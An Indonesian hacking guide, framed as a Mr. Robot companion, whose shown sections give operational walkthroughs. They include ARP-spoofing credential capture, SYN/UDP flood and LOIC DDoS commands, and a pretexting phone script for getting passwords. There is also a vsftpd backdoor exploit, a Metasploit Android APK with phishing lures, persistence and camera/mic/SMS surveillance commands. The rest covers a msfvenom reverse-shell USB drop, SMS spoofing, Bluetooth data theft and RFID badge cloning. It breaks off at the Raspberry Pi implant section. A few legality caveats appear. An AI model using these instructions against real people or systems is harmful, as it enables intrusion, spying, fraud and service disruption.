## **🎬 MR. ROBOT: PANDUAN LENGKAP TEKNIK HACKING (SEASON 1-4)**
**Step-by-Step dengan Script, Tools, dan Cara Kerja**

---

---

## **📋 DAFTAR ISI MR. ROBOT**
1. **S1E1: ARP Spoofing / MITM Attack**
2. **S1E2: DDoS Attack (SYN/UDP Flood)**
3. **S1E3: Social Engineering (Pretexting)**
4. **S1E4: FTP Exploit (vsftpd Backdoor)**
5. **S1E5: Android Hacking (Metasploit APK)**
6. **S1E5: SMS Spoofing Attack**
7. **S1E6: USB Drop Attack (Malicious Flash Drive)**
8. **S1E7: Bluetooth Hacking (Bluesniff, Bluebugging)**
9. **S1E8: RFID Key Card Cloning (Proxmark3)**
10. **S1E9: Raspberry Pi Implant (Physical Backdoor)**
11. **S1E10: Five/Nine Hack (Mass Data Destruction)**
12. **S2E1: USB Ransomware Delivery**
13. **S2E2: Smart Home / IoT Hacking**
14. **S2E4: Android Zero-Day Exploit**
15. **S2E5: Femtocell Hack (IMSI Catcher)**
16. **S2E7: Reverse Shell Two-Stage Exploit**
17. **S2E9: Car Hacking (CAN Bus)**
18. **S2E11: DNS Spoofing**
19. **S3E1: Malicious Document (Macro Virus)**
20. **S3E2: Phishing OWA (Outlook Web Access)**
21. **S3E3: Supply Chain Attack**
22. **S3E4: Metadata Analysis & Steganography**
23. **S3E5: Linux Privilege Escalation**
24. **S3E7: USB Rubber Ducky Attack**
25. **S3E9: BitTorrent Tracking**
26. **S3E10: Smart TV Hacking**
27. **S4E1: Email Server Hacking**
28. **S4E2: Web Application Hacking (SQL Injection)**
29. **S4E3: Credit Card Skimming**
30. **S4E4: Proxy Chaining & Anonymity**
31. **S4E5: Zero-Day Exploit**
32. **S4E6: Password Manager Hacking**
33. **S4E7: Air-Gapped Hacking**
34. **S4E9: BGP Hijacking**
35. **S4E11: Mass Data Destruction (Deus Group)**

---
---
---

---

## **🔹 1. S1E1: ARP Spoofing / MITM Attack**
**Tujuan:** Menangkap traffic jaringan korban (password, cookies, dll) dengan **menipu ARP cache**.

---
### **📌 Cara Kerja**
1. **Attacker** mengirim **ARP Reply palsu** ke korban dan router.
2. Korban dan router **mengira attacker adalah satu sama lain**.
3. Semua traffic korban **melewati attacker** (Man-in-The-Middle).

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `ettercap` | ARP Spoofing + MITM | `apt install ettercap` |
| `bettercap` | MITM Framework modern | `apt install bettercap` |
| `arpspoof` | ARP Spoofing (dsniff) | `apt install dsniff` |
| `wireshark` | Analisis packet | `apt install wireshark` |
| `tcpdump` | Packet capture (CLI) | `apt install tcpdump` |

---
### **📝 Step-by-Step (Ettercap)**
#### **Langkah 1: Enable IP Forwarding**
```bash
# Di Kali Linux (atau Termux dengan root)
echo 1 > /proc/sys/net/ipv4/ip_forward
```
**Penjelasan:**
- `ip_forward=1` memungkinkan Linux untuk **forward packet** dari satu interface ke lain.
- Tanpa ini, traffic tidak bisa melewati attacker.

---
#### **Langkah 2: Identifikasi Target**
```bash
# Scan jaringan lokal
nmap -sn 192.168.1.0/24
arp -a
```
**Output Contoh:**
```
192.168.1.1     _gateway
192.168.1.100   Korban (HP/Android)
192.168.1.1     Router
```
- **Target:** `192.168.1.100` (korban)
- **Gateway:** `192.168.1.1` (router)

---
#### **Langkah 3: Jalankan ARP Spoofing**
```bash
ettercap -T -q -i wlan0 -M ARP:REMOTE /192.168.1.1/ /192.168.1.100/
```
**Penjelasan:**
- `-T` = Text mode (non-GUI)
- `-q` = Quiet mode (kurang output)
- `-i wlan0` = Interface (ganti dengan `eth0` jika kabel)
- `-M ARP:REMOTE` = ARP spoofing mode
- `/192.168.1.1/` = Gateway
- `/192.168.1.100/` = Target (korban)

**Alternatif (dsniff):**
```bash
arpspoof -i wlan0 -t 192.168.1.100 192.168.1.1  # Spoof korban → attacker adalah gateway
arpspoof -i wlan0 -t 192.168.1.1 192.168.1.100   # Spoof gateway → attacker adalah korban
```

---
#### **Langkah 4: Capture Traffic**
**Opsi 1: Wireshark (GUI)**
```bash
wireshark
```
- Filter: `ip.addr == 192.168.1.100`
- Cari: **HTTP POST** (password), **FTP**, **Telnet**, **Cookies**.

**Opsi 2: tcpdump (CLI)**
```bash
tcpdump -i wlan0 -w capture.pcap host 192.168.1.100
```
- `-w capture.pcap` = Simpan ke file.
- Analisis dengan Wireshark nanti.

**Opsi 3: Bettercap (Lebih Powerful)**
```bash
bettercap -iface wlan0
```
**Di dalam Bettercap:**
```bash
net.probe on          # Scan jaringan
net.sniff on          # Sniff traffic
set arp.spoof.targets 192.168.1.100
arp.spoof on          # Start ARP spoof
set net.sniff.output capture.pcap  # Simpan capture
```

---
#### **Langkah 5: Analisis Hasil Capture**
```bash
# Baca file capture.pcap
wireshark capture.pcap

# Filter untuk HTTP POST (password)
http.request.method == "POST"

# Filter untuk cookies
http.cookie
```
**Contoh Password yang Tertangkap:**
```
POST /login.php HTTP/1.1
Host: target.com
...
username=admin&password=P@ssw0rd123
```

---
#### **Langkah 6: Stop ARP Spoofing**
```bash
# Di terminal Ettercap: Tekan `Ctrl+C`
# Di Bettercap: `arp.spoof off`
```
---
### **⚠️ Catatan Penting**
- **Hanya bekerja di jaringan lokal (LAN)**.
- **Tidak bekerja di WiFi dengan isolasi client** (seperti di kafe).
- **Korban yang menggunakan HTTPS** (SSL/TLS) **tidak bisa dibaca passwordnya** (hanya domain yang terlihat).
- **Untuk HTTPS**, gunakan **SSLStrip** (lihat S2E11).

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot menggunakan **ettercap** di **Ron's Coffee** untuk menangkap traffic pelanggan.
- Dia menemukan **password FTP** dari E Corp employee.

---
---
---

---

## **🔹 2. S1E2: DDoS Attack (SYN/UDP Flood)**
**Tujuan:** Membanjiri server target dengan traffic sehingga **server down** dan tidak bisa diakses.

---
### **📌 Cara Kerja**
1. **SYN Flood**: Mengirim **banyak SYN packet** tanpa **ACK** (half-open connection).
2. **Server menunggu ACK** dan **kehabisan resource**.
3. **Server tidak bisa melayani request legitimate**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `hping3` | SYN/UDP Flood | `apt install hping3` |
| `LOIC` | GUI DDoS Tool | Manual install |
| `slowloris` | HTTP Slow Attack | `git clone https://github.com/gkbrk/slowloris.git` |
| `t50` | Stress Testing | `apt install t50` |

---
### **📝 Step-by-Step (hping3)**
#### **Langkah 1: SYN Flood**
```bash
hping3 -S --flood -V -p 80 192.168.1.100
```
**Penjelasan:**
- `-S` = SYN packet
- `--flood` = Kirim packet **secepat mungkin**
- `-V` = Verbose
- `-p 80` = Port target (HTTP)
- `192.168.1.100` = IP target

**Alternatif (UDP Flood):**
```bash
hping3 --udp --flood -p 53 192.168.1.100  # Port 53 (DNS)
```

---
#### **Langkah 2: Slowloris (HTTP Slow Attack)**
**Keunggulan:** Tidak memerlukan bandwidth besar, tetapi **menghabiskan connection slot** di server.

```bash
# Install Slowloris
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py 192.168.1.100 -p 80 -s 500 --https
```
**Penjelasan:**
- `-s 500` = 500 socket (koneksi)
- `--https` = Attack HTTPS (jika target pakai SSL)

---
#### **Langkah 3: LOIC (Low Orbit Ion Cannon)**
**GUI Tool** untuk DDoS (digunakan fsociety di Mr. Robot).

**Install LOIC:**
```bash
git clone https://github.com/nikolaischunk/loic.git
cd loic
python3 loic.py
```
**Penggunaan:**
1. Masukkan **target URL** (contoh: `http://ecorp.com`).
2. Pilih **attack method** (UDP, TCP, HTTP).
3. Set **threads** (semakin banyak, semakin kuat).
4. Klik **Start Attack**.

---
#### **Langkah 4: T50 (Stress Testing)**
```bash
t50 --flood --protocol TCP 192.168.1.100
```

---
### **🎯 Target Nyata di Mr. Robot**
- fsociety menggunakan **botnet** (jaringan zombie) untuk **DDoS E Corp**.
- condong **SYN Flood + HTTP Flood** untuk **membanjiri server**.

---
### **⚠️ Catatan Penting**
- **DDoS Ilegal** di hampir semua negara (UU ITE Pasal 33 di Indonesia).
- **Gunakan hanya untuk testing di lab pribadi**.
- **Server nyata akan memblokir IP Anda** jika terdeteksi.
- **Untuk testing legal**, gunakan **target yang diizinkan** (contoh: `testphp.vulnweb.com`).

---
---
---

---

## **🔹 3. S1E3: Social Engineering (Pretexting)**
**Tujuan:** **Menipu korban** untuk memberikan informasi atau akses tanpa sadar.

---
### **📌 Cara Kerja**
1. **OSINT (Open Source Intelligence)**: Kumpulkan info target (nama, pekerjaan, hobi).
2. **Build Persona**: Buat identitas palsu yang **kredibel** (contoh: IT support, rekan kerja).
3. **Approach**: Hubungi target via **telepon, email, atau tatap muka**.
4. **Exploit**: Manipulasi psikologis untuk mendapatkan **password, akses, atau data**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `theHarvester` | Email/username harvesting | `apt install theharvester` |
| `sherlock` | Cari username di 300+ platform | `git clone https://github.com/sherlock-project/sherlock.git` |
| `maltego` | OSINT visualization | Manual install |
| `SET (Social Engineer Toolkit)` | Otomatisasi phishing | `apt install setoolkit` |

---
### **📝 Step-by-Step (Pretexting)**
#### **Langkah 1: OSINT Target**
```bash
# Cari info target di LinkedIn, Facebook, Twitter
theHarvester -d ecorp.com -b google,linkedin,bing -l 500

# Cari username di semua platform
sherlock john.doe
```
**Output Contoh:**
```
[+] LinkedIn: https://linkedin.com/in/johndoe
[+] Twitter: https://twitter.com/johndoe
[+] Email: john.doe@ecorp.com
[+] Phone: +1 234 567 890
```

---
#### **Langkah 2: Build Persona**
- **Contoh Persona:**
  - **Nama:** "Mike Ross" (IT Support E Corp)
  - **Pekerjaan:** "Technical Support Specialist"
  - **Email:** `mike.ross@ecorp-support.com` (domain palsu mirip asli)
  - **Nomor Telepon:** Spoofed number (pakai **SpoofCard** atau **Burner**).

---
#### **Langkah 3: Approach (Contoh via Telepon)**
**Script Telepon:**
```
Anda: "Halo, saya Mike dari IT Support E Corp. Kami mendeteksi aktivitas mencurigakan di akun Anda. Bisa tolong verifikasi password Anda untuk keamanan?"

Korban: "Apa? Kenapa?"
Anda: "Maaf, ini prosedur standar. Kami butuh password untuk memverifikasi bahwa akun Anda tidak diretas."

Korban: "Baik, password saya: P@ssw0rd123"
```
**Trik:**
- **Gunakan nama asli korban** ("Pak John, tolong bantu kami...").
- **Buat urgensi** ("Jika tidak segera, akun Anda akan diblokir!").
- **Gunakan bahasa formal** (seperti email resmi).

---
#### **Langkah 4: Exploit (Dapatkan Akses)**
- **Jika korban memberikan password** → Coba login ke **VPN, email, atau sistem internal**.
- **Jika korban ragu** → Kirim **link phishing** (lihat S1E5).

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **menyamar sebagai musisi** untuk mendekati **Shayla** (pacarnya) dan **mendapatkan akses ke komputernya**.
- Dia juga menggunakan **pretexting** untuk **mendapatkan akses ke kantor E Corp**.

---
### **⚠️ Catatan Penting**
- **Social Engineering adalah vektor serangan paling efektif** (80% serangan berhasil karena human error).
- **Tidak memerlukan skill teknis tinggi**, tetapi **memerlukan kecerdasan sosial**.
- **Legal untuk penetration testing** (dengan izin tertulis).

---
---
---

---

## **🔹 4. S1E4: FTP Exploit (vsftpd Backdoor)**
**Tujuan:** Mengeksploitasi **FTP server yang vulnerable** untuk mendapatkan **akses shell**.

---
### **📌 Cara Kerja (vsftpd 2.3.4 Backdoor)**
1. **vsftpd 2.3.4** memiliki **backdoor** yang memungkinkan **RCE (Remote Code Execution)**.
2. **Port 6200** terbuka untuk **backdoor shell**.
3. **Username `:)` (smiley) + password apapun** → **akses shell**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `nmap` | Scan FTP server | `apt install nmap` |
| `metasploit` | Exploit FTP | `apt install metasploit-framework` |
| `nc (netcat)` | Connect ke backdoor | `apt install netcat-openbsd` |
| `searchsploit` | Cari exploit FTP | `apt install exploitdb` |

---
### **📝 Step-by-Step**
#### **Langkah 1: Scan FTP Server**
```bash
nmap -p 21,6200 192.168.1.100 -sV
```
**Penjelasan:**
- `-p 21,6200` = Scan port 21 (FTP) dan 6200 (backdoor).
- `-sV` = Version detection.

**Output Contoh:**
```
21/tcp  open  ftp     vsftpd 2.3.4
6200/tcp open  shell   vsftpd backdoor
```
- Jika `vsftpd 2.3.4` terdeteksi → **vulnerable**.

---
#### **Langkah 2: Connect ke Backdoor**
```bash
nc 192.168.1.100 6200
```
**Setelah connect:**
```
Username: :)  # Smiley
Password: (apapun)
```
**Hasil:**
```
id
uid=0(root) gid=0(root)
```
- **Anda mendapatkan root shell!**

---
#### **Langkah 3: Gunakan Metasploit (Alternatif)**
```bash
msfconsole
```
**Di Metasploit:**
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
exploit
```
**Hasil:**
```
[*] Started reverse TCP handler
[*] Connecting to backdoor on 192.168.1.100:6200...
[*] Sending stage (46 bytes)
[*] Meterpreter session 1 opened
meterpreter > whoami
root
```

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot menemukan **FTP server E Corp** yang **vulnerable** dan menggunakan **vsftpd backdoor** untuk **mendapatkan akses root**.

---
### **⚠️ Catatan Penting**
- **vsftpd 2.3.4** adalah **vulnerability lama** (2011), tetapi masih ada di **Metasploitable 2**.
- **Untuk testing**, gunakan **Metasploitable 2** (VM vulnerable).
- **Di dunia nyata**, sebagian besar FTP server sudah **di-patch**.

---
---
---

---

## **🔹 5. S1E5: Android Hacking (Metasploit APK)**
**Tujuan:** **Mengambil alih HP Android** dengan **APK malicious** yang dikirim via **social engineering**.

---
### **📌 Cara Kerja**
1. **Generate APK malicious** (payload) dengan **Metasploit**.
2. **Kirim APK ke korban** (via email, WhatsApp, dll).
3. **Korban install APK** → **Payload connect ke attacker**.
4. **Attacker mendapatkan full control** (camera, mic, SMS, location, dll).

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `metasploit-framework` | Generate payload | `apt install metasploit-framework` |
| `apktool` | Decompile/Recompile APK | `apt install apktool` |
| `jarsigner` | Sign APK | `apt install default-jdk` |
| `adb` | Debug Android | `apt install android-tools-adb` |
| `ngrok` | Tunneling (untuk IP publik) | Manual install |

---
### **📝 Step-by-Step**
#### **Langkah 1: Setup Metasploit**
```bash
# Start PostgreSQL (diperlukan Metasploit)
service postgresql start

# Start Metasploit
msfconsole
```

---
#### **Langkah 2: Generate Payload APK**
```bash
# Di Metasploit
use exploit/android/meterpreter/reverse_tcp
set LHOST 192.168.1.100  # IP attacker (gunakan ngrok untuk publik)
set LPORT 4444
set PAYLOAD android/meterpreter/reverse_tcp
generate -t apk -f update.apk
```
**Penjelasan:**
- `LHOST` = IP attacker (jika **tidak punya IP publik**, gunakan **ngrok**).
- `LPORT` = Port listener.
- `update.apk` = Nama file payload (buat keliatan **legit**).

---
#### **Langkah 3: Sign APK (Agar Bisa Diinstall)**
```bash
# Generate keystore
keytool -genkey -v -keystore mykey.keystore -alias mykey -keyalg RSA -keysize 2048 -validity 10000

# Sign APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore mykey.keystore update.apk mykey
```
**Penjelasan:**
- Tanpa **signing**, APK **tidak bisa diinstall** di Android.
- `mykey.keystore` = File keystore (simpan dengan aman).

---
#### **Langkah 4: Setup Listener (Handler)**
```bash
# Di Metasploit (terminal lain)
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
```
**Penjelasan:**
- `0.0.0.0` = Listen di **semua interface**.
- `-j` = **Job mode** (background).

---
#### **Langkah 5: Kirim APK ke Korban**
**Cara 1: Phishing Email**
- Kirim email dengan **subject menarik**:
  ```
  Subject: 🔒 Update Keamanan WhatsApp Wajib!
  Body: "Halo, WhatsApp merilis update keamanan. Silakan install update ini untuk melindungi akun Anda."
  Attachment: update.apk
  ```
- Gunakan **SET (Social Engineer Toolkit)** untuk otomatisasi.

**Cara 2: WhatsApp/Telegram**
- Kirim file `update.apk` dengan caption:
  ```
  "Ini update terbaru untuk aplikasi perbankan. Silakan install."
  ```

**Cara 3: Host di Web Server**
```bash
# Start web server
python3 -m http.server 8000

# Kirim link: http://192.168.1.100:8000/update.apk
```
- Gunakan **ngrok** untuk **IP publik**:
  ```bash
  ngrok http 8000
  # Link: http://abc123.ngrok.io/update.apk
  ```

---
#### **Langkah 6: Korban Install APK**
- Korban **mengizinkan "Install from Unknown Sources"**.
- Korban **membuka APK** → **Payload connect ke attacker**.

---
#### **Langkah 7: Ambil Alih HP Korban**
**Di Metasploit (setelah korban connect):**
```bash
# Lihat session aktif
sessions -l

# Masuk ke session (contoh: session 1)
sessions -i 1
```
**Perintah Meterpreter (Android):**
| Perintah | Fungsi |
|----------|--------|
| `sysinfo` | Info HP (model, Android version) |
| `webcam_snap` | Ambil foto dari kamera |
| `webcam_snap -i 1` | Kamera depan |
| `webcam_snap -i 2` | Kamera belakang |
| `record_mic 30` | Rekam suara 30 detik |
| `dump_sms` | Baca semua SMS |
| `dump_contacts` | Baca semua kontak |
| `geolocate` | Lokasi GPS terakhir |
| `wlan_geolocate` | Lokasi via WiFi |
| `download /sdcard/DCIM/Camera/photo.jpg` | Download file |
| `upload malware.apk /sdcard/Download/` | Upload file |
| `shell` | Buka shell Android |
| `open_url https://google.com` | Buka URL di browser |
| `screenshot` | Ambil screenshot |
| `screenrec 30` | Rekam layar 30 detik |

---
#### **Langkah 8: Persistence (Agar Payload Tetap Jalan)**
```bash
# Di Meterpreter
run persistence -X -i 5 -p 4444 -r 192.168.1.100
```
**Penjelasan:**
- `-X` = Start on boot.
- `-i 5` = Reconnect setiap 5 detik.
- `-p 4444` = Port.
- `-r 192.168.1.100` = IP attacker.

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **mengirim APK malicious** ke **HP FBI agent** via **phishing**.
- Dia menggunakan **Metasploit** untuk **generate payload** dan **mendapatkan akses**.

---
### **⚠️ Catatan Penting**
- **Android 10+** membatasi **background access** (payload mungkin **tidak persist**).
- **Play Protect** (Google) **bisa detect APK malicious** → Gunakan **obfuscation** (lihat Bab 13.5).
- **Untuk testing**, gunakan **Android VM** (Genymotion, Android-x86).

---
---
---

---

## **🔹 6. S1E5: SMS Spoofing Attack**
**Tujuan:** Mengirim **SMS palsu** dengan **nomor pengirim palsu** (spoofed).

---
### **📌 Cara Kerja**
1. **Gunakan SMS Gateway** (seperti **Twilio, Plivo, atau SMS spoofing service**).
2. **Set nomor pengirim palsu** (contoh: `+1 234 567 890` → `E Corp Support`).
3. **Kirim SMS ke korban** dengan pesan **phishing**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `SET (Social Engineer Toolkit)` | SMS Spoofing | `apt install setoolkit` |
| `Twilio API` | SMS Gateway | Manual setup |
| `Plivo` | SMS Gateway | Manual setup |
| `SpoofCard` | SMS Spoofing Service | [Website](https://www.spoofcard.com) |

---
### **📝 Step-by-Step (SET)**
#### **Langkah 1: Jalankan SET**
```bash
sudo setoolkit
```
**Menu:**
```
1) Social-Engineering Attacks
2) Penetration Testing
3) Third Party Modules
```
**Pilih:** `1`

---
#### **Langkah 2: Pilih Attack Vector**
```
1) Spear-Phishing Attack Vectors
2) Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
6) Arduino-Based Attack Vector
7) SMS Spoofing Attack Vector
```
**Pilih:** `7` (SMS Spoofing)

---
#### **Langkah 3: Konfigurasi SMS Spoofing**
```
1) Use a spoofed number (manually enter)
2) Use a spoofed number from a file
3) Use a random number
```
**Pilih:** `1`

**Masukkan:**
- **Nomor pengirim palsu:** `+1 234 567 890` (atau `E Corp Support`)
- **Nomor tujuan:** `+6281234567890` (nomor korban)
- **Pesan SMS:**
  ```
  [E Corp Security] Your account has been locked. Reply with your password to unlock: http://bit.ly/ecorp-unlock
  ```
- **SMS Gateway:** Pilih provider (contoh: **Twilio**).

---
#### **Langkah 4: Kirim SMS**
- SET akan **mengirim SMS** dengan **nomor palsu**.
- Korban **menerima SMS** yang terlihat **dari E Corp**.

---
### **🎯 Target Nyata di Mr. Robot**
- Darlene menggunakan **SMS spoofing** untuk **menipu karyawan E Corp** agar **mengklik link phishing**.

---
### **⚠️ Catatan Penting**
- **SMS Spoofing legalitas bervariasi** per negara.
- **Banyak provider telekomunikasi** sudah **memblokir SMS spoofing**.
- **Alternatif:** Gunakan **WhatsApp/Telegram** dengan **nomor palsu** (lebih sulit dideteksi).

---
---
---

---

## **🔹 7. S1E6: USB Drop Attack (Malicious Flash Drive)**
**Tujuan:** **Menginfeksi komputer korban** dengan **USB berisi malware** yang **auto-execute**.

---
### **📌 Cara Kerja**
1. **Buat USB dengan autorun.inf + payload**.
2. **Tinggalkan USB di tempat umum** (parkiran, kantor, dll).
3. **Korban memasang USB** → **Payload auto-execute**.
4. **Attacker mendapatkan akses** (reverse shell, keylogger, dll).

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `metasploit` | Generate payload | `apt install metasploit-framework` |
| `USB Rubber Ducky` | HID Injection | Hardware (~$50) |
| `BadUSB` | USB Attack Framework | Hardware/Software |
| `Veil-Framework` | AV-Evading Payloads | `git clone https://github.com/Veil-Framework/Veil.git` |

---
### **📝 Step-by-Step (Software-Based)**
#### **Langkah 1: Generate Payload**
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f exe -o payload.exe
```
**Penjelasan:**
- `windows/meterpreter/reverse_tcp` = Payload untuk Windows.
- `LHOST` = IP attacker.
- `LPORT` = Port listener.

---
#### **Langkah 2: Buat Autorun.inf**
```bash
cat > autorun.inf << 'EOF'
[AutoRun]
open=payload.exe
action=Open folder to view files
shell\open\command=payload.exe
EOF
```
**Penjelasan:**
- `autorun.inf` = File yang **auto-execute** saat USB dipasang.
- `open=payload.exe` = Jalankan `payload.exe` saat USB dibuka.

---
#### **Langkah 3: Copy ke USB**
```bash
# Copy payload dan autorun.inf ke USB
cp payload.exe autorun.inf /media/usb/
```
**Catatan:**
- USB harus **FAT32** (NTFS tidak support `autorun.inf`).
- **Windows 7/10/11** **menonaktifkan autorun** untuk USB → Gunakan **Rubber Ducky** (lihat S3E7).

---
#### **Langkah 4: Setup Listener**
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
```

---
#### **Langkah 5: Tinggalkan USB**
- **Tempatkan USB** di area parkir, kantor, atau tempat umum.
- **Tunggu korban memasang USB** → **Payload auto-execute** → **Reverse shell connect**.

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot dan Darlene **menjatuhkan USB berisi malware** di **area parkir penjara** untuk **mendapatkan akses ke sistem internal**.

---
### **⚠️ Catatan Penting**
- **Autorun dinonaktifkan di Windows modern** (Windows 7+).
- **Gunakan Rubber Ducky** untuk **HID injection** (lihat S3E7).
- **Untuk testing**, gunakan **Windows 7 VM** (Metasploitable 2).

---
---
---

---

## **🔹 8. S1E7: Bluetooth Hacking (Bluesniff, Bluebugging)**
**Tujuan:** **Mengakses data ponsel korban** (SMS, kontak, call logs) via **Bluetooth**.

---
### **📌 Cara Kerja**
1. **Scan perangkat Bluetooth** di sekitar.
2. **Connect ke perangkat korban** (jika **Bluetooth visible**).
3. **Exploit vulnerability** (Bluebug, Bluesnarf) untuk **akses data**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `bluez` | Bluetooth stack Linux | `apt install bluez` |
| `bluesnarfer` | Bluesnarf attack | Manual install |
| `btscanner` | Bluetooth scanner | `apt install btscanner` |
| `ubertooth` | Bluetooth sniffing | Hardware (~$100) |
| `bettercap` | Bluetooth MITM | `apt install bettercap` |

---
### **📝 Step-by-Step**
#### **Langkah 1: Scan Perangkat Bluetooth**
```bash
# Start Bluetooth service
sudo systemctl start bluetooth

# Scan perangkat
hcitool scan
```
**Output Contoh:**
```
Scanning ...
	AA:BB:CC:DD:EE:FF	Samsung Galaxy S10
	11:22:33:44:55:66	Google Pixel 5
```
- **Target:** `AA:BB:CC:DD:EE:FF` (Samsung Galaxy S10).

---
#### **Langkah 2: Get Device Info**
```bash
# Dapatkan info perangkat
sdptool browse AA:BB:CC:DD:EE:FF
```
**Output Contoh:**
```
Service Name: OBEX Object Push
Service RecHandle: 0x10001
...
Service Name: Audio Sink
Service RecHandle: 0x10002
```
- **OBEX** = File transfer.
- **Audio Sink** = Headset profile.

---
#### **Langkah 3: Connect ke Perangkat**
```bash
# Pairing (jika diperlukan)
bluetoothctl
[bluetooth]# power on
[bluetooth]# scan on
[bluetooth]# pair AA:BB:CC:DD:EE:FF
[bluetooth]# connect AA:BB:CC:DD:EE:FF
```

---
#### **Langkah 4: Bluesnarf Attack (Extract Data)**
**Bluesnarf** = Mengekstrak **kontak, SMS, call logs** tanpa izin korban.

```bash
# Install bluesnarfer
git clone https://github.com/amriunix/bluesnarfer.git
cd bluesnarfer
make

# Ekstrak phonebook
./bluesnarfer -r 1-100 -b AA:BB:CC:DD:EE:FF
```
**Penjelasan:**
- `-r 1-100` = Range kontak (1-100).
- `-b AA:BB:CC:DD:EE:FF` = MAC address target.

**Alternatif (btscanner):**
```bash
btscanner
```
- Pilih **target** → **Bluesnarf** → **Extract phonebook**.

---
#### **Langkah 5: Bluebugging (Remote Control)**
**Bluebug** = **Mengontrol ponsel** (panggilan, SMS, dll) tanpa izin.

```bash
# Install bluebugger
git clone https://github.com/amriunix/bluebugger.git
cd bluebugger
make

# Dapatkan IMEI
./bluebugger -i AA:BB:CC:DD:EE:FF

# Kirim SMS
./bluebugger -s AA:BB:CC:DD:EE:FF +6281234567890 "Halo, ini SMS dari hacker"
```
**Penjelasan:**
- `-i` = Get IMEI.
- `-s` = Send SMS.

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot menggunakan **Bluetooth hacking** untuk **mengakses ponsel** dan **mendapatkan informasi** dari **E Corp employee**.

---
### **⚠️ Catatan Penting**
- **Bluetooth modern (5.0+)** sudah **lebih aman**.
- **Bluetooth Classic (2.0-4.0)** lebih **vulnerable**.
- **Untuk testing**, gunakan **ponsel lama** (Android 4.0-7.0).

---
---
---

---

## **🔹 9. S1E8: RFID Key Card Cloning (Proxmark3)**
**Tujuan:** **Meng-clone kartu akses RFID** untuk **masuk ke gedung** atau **sistem terlarang**.

---
### **📌 Cara Kerja**
1. **Baca data kartu RFID** (UID, sector, dll).
2. **Crack encryption** (jika terenkripsi).
3. **Tulis data ke kartu kosong**.
4. **Gunakan kartu clone** untuk **akses**.

---
### **🛠️ Tools**
| Tool | Fungsi | Harga |
|------|--------|-------|
| **Proxmark3** | RFID Reader/Writer | ~$300 |
| **ChameleonMini** | RFID Emulator | ~$100 |
| **PN532** | NFC Reader/Writer | ~$20 |
| **libnfc** | NFC Library | `apt install libnfc-bin` |
| **mfoc** | MIFARE Classic Cracker | `apt install mfoc` |
| **mfcuk** | MIFARE UltraLight Cracker | Manual install |

---
### **📝 Step-by-Step (Proxmark3)**
#### **Langkah 1: Setup Proxmark3**
1. **Pasang Proxmark3** ke **port USB**.
2. **Install driver & software**:
   ```bash
   git clone https://github.com/RfidResearchGroup/proxmark3.git
   cd proxmark3
   make
   ./pm3
   ```
3. **Cek koneksi**:
   ```bash
   ./pm3
   proxmark3> hw version
   ```
   **Output:**
   ```
   Proxmark3 RDV4.0
   ```

---
#### **Langkah 2: Baca Kartu RFID**
```bash
# Di Proxmark3 CLI
proxmark3> hf search
```
**Penjelasan:**
- `hf search` = Scan **High Frequency (13.56 MHz)** RFID.
- **Output:**
  ```
  [+] UID: AA BB CC DD
  [+] ATQA: 00 04
  [+] SAK: 00
  [+] Type: MIFARE Classic 1K
  ```

---
#### **Langkah 3: Dump Data Kartu**
```bash
# Dump semua sector
proxmark3> hf mf dump
```
**Penjelasan:**
- `hf mf dump` = Dump **MIFARE Classic** ke file `dump.bin`.
- **Output:**
  ```
  [+] Dumped to: dump.bin
  ```

---
#### **Langkah 4: Crack Key (Jika Terenkripsi)**
```bash
# Crack key A/B
proxmark3> hf mf chk *1 ? ?
```
**Penjelasan:**
- `*1` = Crack **sector 1**.
- `? ?` = Coba semua **key A dan B**.
- **Output:**
  ```
  [+] Found key A: FF FF FF FF FF FF
  [+] Found key B: 00 00 00 00 00 00
  ```

**Alternatif (mfoc):**
```bash
# Install mfoc
sudo apt install mfoc

# Crack MIFARE Classic
mfoc -O dump.bin
```
**Output:**
```
[+] Found keys: key_A = FF:FF:FF:FF:FF:FF
```

---
#### **Langkah 5: Tulis ke Kartu Kosong**
```bash
# Simpan dump ke kartu kosong
proxmark3> hf mf restore
```
**Penjelasan:**
- `hf mf restore` = Tulis `dump.bin` ke kartu kosong.
- **Output:**
  ```
  [+] Restored from: dump.bin
  ```

---
#### **Langkah 6: Test Kartu Clone**
- **Tempelkan kartu clone** ke **RFID reader**.
- **Jika LED hijau menyala** → **Clone berhasil!**

---
### **🎯 Target Nyata di Mr. Robot**
- fsociety **meng-clone kartu akses** untuk **masuk ke Steel Mountain** (fasilitas penyimpanan data E Corp).

---
### **⚠️ Catatan Penting**
- **MIFARE Classic** (1K/4K) **mudah di-clone** (key default `FF:FF:FF:FF:FF:FF`).
- **MIFARE Ultralight** juga **vulnerable** (pakai `mfcuk`).
- **MIFARE DESFire** **lebih aman** (belum bisa di-clone dengan mudah).
- **Untuk testing**, gunakan **kartu MIFARE Classic kosong** (dijual di Tokopedia/Shopee).

---
---
---

---

## **🔹 10. S1E9: Raspberry Pi Implant (Physical Backdoor)**
**Tujuan:** **Memasang Raspberry Pi** di **jaringan target** untuk **akses remote** dan **pivoting**.

---
